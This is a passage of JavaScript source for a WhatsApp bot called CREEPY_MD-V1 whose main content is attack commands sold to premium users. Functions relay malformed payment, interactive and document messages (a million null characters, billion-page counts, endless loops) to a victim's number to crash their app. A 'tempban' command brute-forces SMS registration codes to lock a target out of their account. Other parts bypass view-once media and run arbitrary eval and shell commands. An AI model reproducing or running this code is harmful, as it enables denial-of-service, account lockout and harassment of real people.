													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"#CREEPY MD CRASH ☠️🔥","key":"+923444844060","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await GlobalTechInc.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '#CREEPY MD CRASH ☠️🔥',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await replyglobal(`Bot Creepy In process....`)
            await xeonIosShot(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on panel.", 
    [whatsappNumber]
  );
            }
            
				break;
				case 'hacker-creepy': {
					if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
if (!text) return replyglobal(`Usage .${command} 2556976xxxxx`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 2556976xxxxx`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
    }
    if (cleanedNumber == "923051391007") {
    return;
    }
    if (cleanedNumber == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  async function xeonBugPay(jid){
				await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messagecontextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+923444844060","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await xeonBugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on panel.", 
    [whatsappNumber]
  );
				}
				break;
		case 'creepy-samsung': case 'creepy-all': case 'all-attack': case 'creepy-web': case 'creepy-doublekill': case '💀': case '☠️': {
if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
if (!q) return replyglobal(`Usage .${command} 255697xxxxxx`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 255697xxxxxx`)
let target = xeonyvictim + '@s.whatsapp.net'
await replyglobal(`Bot Creepy In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await replyglobal(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
}
break
case 'ios-creepy': case 'ioscrp': {
            	if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 255697xxxxxx`)
await replyglobal(`Ceeepy In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'black-danny': case 'black-creepy': {
	if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
	const XeonDoc = {
    url: "./80/x.mp3"
};
async function xeonFreeze(jid){
	  for (let i = 0; i < 50; i++) {
await GlobalTechInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "🇹🇿Danny🤖" + creepyd1,
    'mimetype': "application/zip",
    'caption': "🇹🇿Danny🤖" + creepyd1,
    'pageCount': 0x3b9aca00,
    'contactVcard': true
});
}
}

await xeonFreeze(m.chat);
	}
	break
	case 'bkack-dannygc': case 'group-death': case 'group-end': {
		if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
		const xeonimage = {
    title: "🇹🇿Danny🤖; ",
    hasMediaAttachment: true,
    imageMessage: thumb.imageMessage
};

const xtext = {
    text: ''
};

GlobalTechInc.relayMessage(m.chat, {
    'viewOnceMessage': {
        'message': {
            'interactiveMessage': {
                'header': xeonimage,
                'body': xtext,
                'nativeFlowMessage': {
                    'buttons': [{
                        'name': "galaxy_message",
                        'buttonParamsJson': JSON.stringify({
                            'header': "🇹🇿Danny🤖; ",
                            'body': "xxx",
                            'flow_action': "navigate",
                            'flow_action_payload': {
                                'screen': "FORM_SCREEN"
                            },
                            'flow_cta': "xxxxx",
                            'flow_id': "1169834181134583",
                            'flow_message_version': '3',
                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                        })
                    }],
                    'messageParamsJson': ''
                },
                'contextInfo': {
                    'isForwarded': true,
                    'fromMe': false,
                    'participant': "0@s.whatsapp.net",
                    'remoteJid': m.chat,
                    'quotedMessage': {
                        'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/pdf",
                            'title': "crash",
                            'pageCount': 0x3b9aca00,
                            'fileName': "crash.pdf",
                            'contactVcard': true
                        }
                    },
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "120363222395675670@newsletter",
                        'serverMessageId': 0x1,
                        'newsletterName': "🇹🇿Danny🤖"
                    }
                }
            }
        }
    }
}, {});
		}
		break
		case 'black-dannyios': case 'ios-death':{
			if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
			const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Danny is ur father`
}}
}
			async function XeonyCrashyIos(dgxeon, chat, participant) {
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `🇹🇿Danny🤖${creepyd11}`,
      caption: `🇹🇿Danny🤖 ${creepyd11}`,
    },
    { quoted: { ...subscribe_dgxeon, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
  );
}
  async function executeIosAttack() {
    if (!args[0]) amount = `99`;
    for (let i = 1; i < 10; i++) {
      XeonyCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here
      
    }
    }
            await executeIosAttack();
            }
    break;
case 'creepy-ban': case 'tempban': {
	if (!isPremium) return replyglobal("This is for Creepy premium users🥱")
  if (args.length < 1) return replyglobal(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 255|69760xxxx`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return replyglobal(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 255|69760xxxx`);
  const xeonCountryCode = args2[0];
  const xtarget = args2[1];
  const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
  const xeonmerge = `${xeonCountryCode}${xtarget}`
  const xeonMention = xeonmerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "The user us banned temporarily by creepy @" + xeonMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that creepy won't stop on panel.", 
    [xeonMention]
  );
  try {
    const { stateXeon, saveCredsXeon } = await useMultiFileAuthState('./session');
    const xeonRequest = await GlobalTechInc.requestRegistrationCode({
      phoneNumber: '+' + xeonCountryCode + `${xeonNumber}`,
      phoneNumberCountryCode: xeonCountryCode,
      phoneNumberNationalNumber: `${xeonNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var xeonPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await GlobalTechInc.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
      console.log(`${xeonPrefix}-${xeonSuffix}`);
    }
  }
}
break;

//view once open


const { downloadMediaMessage } = require('@whiskeysockets/baileys');

case 'creepy-open':
case 'open':
case 'view': {
    if (!quoted) return replyglobal(`Reply to a view-once image, video, or audio.`);

    try {
        // Check if message has media (image, video, or audio)
        let media = await quoted.download();
        let caption = quoted.text || quoted.caption || ''; // Extract caption if present

        if (/image/.test(mime)) {
            await GlobalTechInc.sendMessage(m.chat, { image: media, caption: `CREEPY_MD-V1\n> Image executed 💯.\n\n${caption}` }, { quoted: m });
        } else if (/video/.test(mime)) {
            await GlobalTechInc.sendMessage(m.chat, { video: media, caption: `CREEPY_MD-V1\n> Video executed 💯.\n\n${caption}` }, { quoted: m });
        } else if (/audio/.test(mime)) {
            await GlobalTechInc.sendMessage(m.chat, { audio: media, mimetype: 'audio/mp4', caption: `CREEPY_MD-V1\n> Audio executed 💯.\n\n${caption}` }, { quoted: m });
        } else {
            return replyglobal(`Unsupported media type. Please reply to an image, video, or audio.`);
        }

    } catch (error) {
        console.error("Error processing media:", error); // Logs error but does not send a message to the user
    }
}
break;

case 'update': {
    if (!isCreator) return replyglobal('😡 You are not my owner dude 🚫.');

    replyglobal('uodating bot... 🔄');

    setTimeout(() => {
        process.exit(1); // Stop the bot process
    }, 2000); // Wait 2 seconds before exiting
}
break;

case 'delspam': {
    if (!isGroup) return replyglobal('This command can only be used in groups.');
    if (!isAdmin && !isOwner) return replyglobal('Only admins and owners can use this command.');
    
    let targetUser = quoted ? quoted.sender : (mentionedJid[0] ? mentionedJid[0] : null);
    if (!targetUser) return replyglobal('Reply to a message or mention a user to delete their messages.');

    let messages = await GlobalTechInc.loadMessages(m.chat, 1000); // Load last 1000 messages
    let toDelete = messages.messages.filter(msg => msg.key.participant === targetUser || msg.key.remoteJid === targetUser);

    if (toDelete.length === 0) return replyglobal('No messages found for this user.');

    replyglobal(`Deleting ${toDelete.length} messages from ${targetUser}, please wait...`);

    // Delete messages one by one with delay
    for (let i = 0; i < toDelete.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds delay
        await GlobalTechInc.sendMessage(m.chat, { delete: toDelete[i].key });
    }

    replyglobal(`Successfully deleted messages from ${targetUser}.`);
}
break;

case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
  
case 'menu':
case 'fullmenu': {
    let reaction = sendReaction('🤖');
    let menuMessage = `
╔═══ ❰ \`𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏\` ❱ ══╗
║ *Hello* \`${pushname}\`, 👋                      
║ *My name is 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏*
║ Type \`Creepy\` to see the full menu.
╚═════════════════════╝
`.trim();

    await GlobalTechInc.sendMessage(
        m.chat,
        {
            text: menuMessage,
            contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: `CREEPY_MD-V1`,
                    body: `𝐷𝛥𝛮𝛮𝑌`,
                    thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
                    sourceUrl: global.link,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        },
        { quoted: m }
    );
}
break
       case 'creepy':
       case 'creepy-md': 
    let reaction = sendReaction('👽');
    let xeonmenuoh = `
╔══ ❰ \`𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏\` ❱ ══╗
║ *Hello* \`${pushname}\`, 👋                      
║ *My name is 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏*
╚═══════════════════╝
╔═ ❰ \`MAIN MENU\` ❱ ══╗
║ ◆ *creepy*                                      
║ ◆ *menu*                                        
║ ◆ *p*                                         
║ ◆ *buypremium*                                
║ ◆ *runtime*                                     
║ ◆ *file*                                       
║ ◆ *script*                                      
║ ◆ *support*                                     
║ ◆ *owner*                                       
╚══════════════╝${readmore}
╔═ ❰ \`BUG ANDROID\` ❱ ══╗
║ ◆ *creepy-android*                              
║ ◆ *creepy-android2*                              
║ ◆ *creepy-uicrash*                            
║ ◆ *creepy-smash*                                
║ ◆ *killer-creepy*                              
║ ◆ *hacker-creepy*                               
║ ◆ *black-danny*                               
╚═══════════════╝
╔═ ❰ \`BUG WEB\` ❱ ══╗
║ ◆ *black-danny*                               
║ ◆ *black-dannygc*                             
║ ◆ *black-dannyios*                             
╚══════════════╝
╔══ ❰ \`BUG IOS\` ❱ ═══╗
║ ◆ *creepy-ios*                                 
║ ◆ *creepy-ios2*                               
║ ◆ *creepy-attack*                             
║ ◆ *black-dannyios*                            
║ ◆ *ios-creepy*                                  
╚═══════════════╝
╔══ ❰ \`BUG OTHER\` ❱ ══╗
║ ◆ *tempban*                                
║ ◆ *creepy-ban*                                
║ ◆ *💀*                                        
║ ◆ *☠️*                                         
╚═══════════════╝
╔═ ❰ \`GROUP BUGS\` ❱ ══╗
║ ◆ *group-death*                                
║ ◆ *black-dannygc*                              
║ ◆ *creepy-bug-group*                        
║ ◆ *creepy-gc*                                  
╚════════════════╝
╔══ ❰ \`OWNER MENU\` ❱ ═╗
║ ◆ *getsession*                                
║ ◆ *deletesession*                            
║ ◆ *join*                                    
║ ◆ *shutdown*                                 
║ ◆ *restart*                                     
║ ◆ *autoread [on/off]*                        
║ ◆ *autotyping [on/off]*                       
║ ◆ *autorecording [on/off]*                     
║ ◆ *autorecordtyp [on/off]*                  
║ ◆ *autoswview [on/off]*                 
║ ◆ *autobio [on/off]*                         
║ ◆ *mode [self/public]*                       
║ ◆ *block*                                   
║ ◆ *update*                                    
║ ◆ *backup*                                  
║ ◆ *getcase*                                  
║ ◆ *newowner*                                
║ ◆ *delowner*                                    
║ ◆ *creepy-open [viewonce]*                   
║ ◆ *unblock*                           
╚══════════════════╝
╔═ ❰ \`GROUP MENU\` ❱ ══╗
║ ◆ *closetime*                                 
║ ◆ *opentime*                               
║ ◆ *kick*                                 
║ ◆ *add*                                   
║ ◆ *promote*                                  
║ ◆ *demote*                                      
║ ◆ *setdesc*                                   
║ ◆ *tagall*                                     
║ ◆ *hidetag*                                    
║ ◆ *totag*                                     
║ ◆ *group [option]*                           
║ ◆ *editinfo*                                    
║ ◆ *linkgc*                                   
║ ◆ *revoke*                                     
║ ◆ *listonline* 
║ ◆ *kickall*
║ ◆ *alladmins*
║ ◆ *demoteall*
║ ◆ *toall*
║ ◆ *ban*    
║ ◆ *unban*                            
║ ◆ *antilink (beta)*   
║ ◆ *delspam*
║ ◆ *mgc*                             
╚═════════════════╝
╔════ ❰ \`TOOLS MENU\` ❱ ═══╗
║ ◆ *ytmp3 <link>*                              
║ ◆ *ytmp4 <link>*                               
║ ◆ *play <song name>*    
║ ◆ *video* <video name>  
║ ◆ *Facebook <link>*
║ ◆ *Instagram <link> *
║ ◆ *tiktok <link>*
║ ◆ *ai* <query>
║ ◆ *gpt* <query>                    
╚═════════════════════╝
> Created by Danny
╔═══ ❰ \`CREEPY_MD-V1\` ❱ ═══╗
║ *2025 script By Danny💀*
╚════════════════════╝
╔═══ ❰ \`CREEPY_MD-V1\` ❱ ═══╗
> To get file just type \`file\`                 
> New 2025 update                    
> Created by Danny🫡                   
> ©️Creepy technology                           
╚═════════════════════╝
`
if (typemenu === 'v1') {
                    GlobalTechInc.sendMessage(m.chat, {
                        text: xeonmenuoh,
                        contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                            externalAdReply: {
                                title: `CREEPY_MD-V1`,
                                body: `𝐷𝛥𝛮𝛮𝑌`,
                                thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    GlobalTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./GlobalMedia/thumb2.jpg'),
      gifPlayback: false,
      caption: xeonmenuoh,
      contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
      externalAdReply: {
      title: `CREEPY_MD-V1`,
      body: `𝐷𝛥𝛮𝛮𝑌`,
      thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    GlobalTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./GlobalMedia/thumb2.jpg'),
                        caption: xeonmenuoh,
                        gifPlayback: false
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    GlobalTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xeonmenuoh
                        }
                    }, {})
                }
                break
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replyglobal(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replyglobal('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				GlobalTechInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				GlobalTechInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replyglobal(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyglobal("😡You are not my owner dude🚫")

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyglobal(bang)
                    }
                    try {
                        replyglobal(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyglobal(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyglobal(evaled)
                    } catch (err) {
                        await replyglobal(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyglobal(err)
                        if (stdout) return replyglobal(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})